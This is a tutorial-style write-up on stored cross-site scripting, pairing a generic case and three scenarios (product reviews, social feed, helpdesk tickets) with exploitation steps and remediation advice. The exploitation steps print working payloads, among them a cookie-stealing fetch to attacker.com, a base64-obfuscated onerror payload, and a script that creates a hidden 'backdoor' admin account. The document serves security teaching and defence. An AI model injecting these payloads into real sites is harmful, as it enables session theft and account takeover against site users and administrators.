# Vulnerability Writeup: Cross-Site Scripting (XSS) - Stored

Below is an example of how this vulnerability is often exploited and a proposal of a solution.

# 1. Reconnaissance & Enumeration

  Discovery: During the application mapping phase, a user profile "Biography" section and a public comment board were identified as input vectors that store and display user-supplied data to other visitors.

  Input Testing: Submitting basic alphanumeric text reflected the input accurately on the page. Testing with special characters and basic HTML tags (e.g., <b>test</b>) rendered the formatting, confirming that raw HTML was being accepted.

  Vulnerability Hypothesis: The application stores user input in the backend database without proper sanitization and outputs it directly to the Document Object Model (DOM) without context-aware encoding, creating a Stored XSS vector.

# 2. Exploitation

  Step 1: Injected a proof-of-concept JavaScript payload into the vulnerable biography field: <script>alert(document.domain)</script>.

  Step 2: Saved the profile changes, causing the payload to be written to the application database.

  Step 3: Logged in as a separate, higher-privileged user (e.g., an administrator) and navigated to the public directory to view the profile page containing the injected script.

  Result: The script executed immediately in the administrator's browser context, triggering the alert box and proving that arbitrary JavaScript execution was possible against any user viewing the page. (In a real-world scenario, this could be upgraded to steal session cookies via document.cookie or perform unauthorized administrative actions).

# 3. Remediation

  Context-Aware Output Encoding: Implement strict output encoding (such as HTML entity encoding) before rendering any user-supplied data back to the DOM, converting characters like < and > into safe representations (&lt; and &gt;).

  Content Security Policy (CSP): Deploy a robust CSP HTTP header that restricts where scripts can be loaded from and blocks the execution of inline scripts (script-src 'self').

  HttpOnly Cookie Flag: Ensure all sensitive session cookies are flagged with HttpOnly, which prevents client-side scripts from accessing them even if an XSS vulnerability is successfully exploited.

# Examples

## Example 1: E-Commerce Product Review & Rating Section
1. Reconnaissance & Enumeration

    Discovery: During the application mapping phase, a product review submission form (accepting ratings and text comments) was identified as an input vector that stores data in the backend and displays it publicly on product pages.

    Input Testing: Submitting basic alphanumeric text reflected accurately. Testing with HTML formatting tags (e.g., <b>Great product</b>) rendered correctly, confirming the application accepted raw HTML without stripping tags.

    Vulnerability Hypothesis: The application stores customer review text in the database without sanitization and renders it directly into the DOM of the product page, creating a Stored XSS vector affecting all future visitors.

2. Exploitation

    Step 1: Injected a proof-of-concept payload into the review body: <script>fetch('[http://attacker.com/steal?cookie=](http://attacker.com/steal?cookie=)' + btoa(document.cookie))</script>.

    Step 2: Submitted the review, causing the malicious script to be permanently written to the e-commerce database.

    Step 3: Any ordinary customer browsing the product page loaded the review section.

    Result: The script executed automatically in every shopper's browser context, silently exfiltrating their active session tokens to the attacker's server without requiring any user interaction beyond viewing the product.

3. Remediation

    Context-Aware Output Encoding: Apply strict HTML entity encoding before rendering review text back to the DOM, converting characters like < and > into safe entities (&lt; and &gt;).

    Content Security Policy (CSP): Deploy a robust CSP header (script-src 'self') to block the execution of inline scripts and unauthorized external scripts.

    HttpOnly Cookie Flag: Protect session identifiers by setting the HttpOnly flag so that client-side scripts cannot access document.cookie.

## Example 2: Social Media Status Update & Activity Feed
1. Reconnaissance & Enumeration

    Discovery: A social network's status update feature was identified. Posts are saved to a timeline database and broadcasted to the feeds of all connected followers.

    Input Testing: Tested the status input box with basic markup characters (<h1>Test</h1>), which successfully rendered as heading tags on the user feed.

    Vulnerability Hypothesis: The status update pipeline lacks input sanitization and output encoding, allowing users to inject arbitrary HTML and JavaScript that will execute whenever followers view their feed.

2. Exploitation

    Step 1: Crafted an advanced payload disguised as an image error handler: <img src="x" onerror="eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vYWRkX2FkbWluJyk='))">.

    Step 2: Posted the status update to the public profile feed.

    Step 3: Followers and friends loaded their dashboards, rendering the malicious feed item.

    Result: The onerror event triggered immediately upon image failure, executing the base64-decoded JavaScript payload which forced victims' browsers to perform background administrative actions on their behalf.

3. Remediation

    HTML Sanitization Libraries: Use robust sanitization libraries (such as DOMPurify) if rich-text HTML input is explicitly required, stripping dangerous tags (<script>, <iframe>, onerror, onload) while preserving safe formatting.

    Context-Aware Output Encoding: Default to encoding all user-generated content unless explicitly parsed through a trusted markdown sanitizer.

    Content Security Policy (CSP): Enforce strict script restrictions to neutralize inline event handlers (onerror, onload).

## Example 3: Internal IT Support Ticket System
1. Reconnaissance & Enumeration

    Discovery: An enterprise IT helpdesk portal allows external clients to submit support tickets with a "Subject" and "Description" field, which are subsequently reviewed by internal IT administrators inside a centralized dashboard.

    Input Testing: Submitting <script> tags in the ticket subject field resulted in the tags appearing unescaped in the administrator's queue table.

    Vulnerability Hypothesis: Internal administrative dashboards trust stored database inputs, omitting output encoding on ticket summaries because the input originated from authenticated users.

2. Exploitation

    Step 1: Submitted a support ticket with a payload in the subject line designed to target admins: <script>var xhr=new XMLHttpRequest();xhr.open('GET','/admin/create-user?user=backdoor&role=admin',true);xhr.send();</script>.

    Step 2: The ticket was saved successfully in the support database.

    Step 3: An IT administrator opened their ticket queue to review incoming requests.

    Result: The script executed automatically inside the high-privileged administrator session, silently creating a backdoor administrative user account (backdoor) without the admin's knowledge or consent.

3. Remediation

    Strict Output Encoding for Dashboards: Treat all data coming from external or untrusted database fields as hostile, applying rigorous context-aware encoding in admin panels just as strictly as public interfaces.

    Privilege Segregation: Ensure administrative actions require explicit re-authentication, multi-step confirmation, or CSRF/anti-automation tokens that cannot be easily bypassed by background script execution.

    Secure Session Management: Ensure administrative sessions have short absolute timeouts and are bound securely to strict transport security controls.
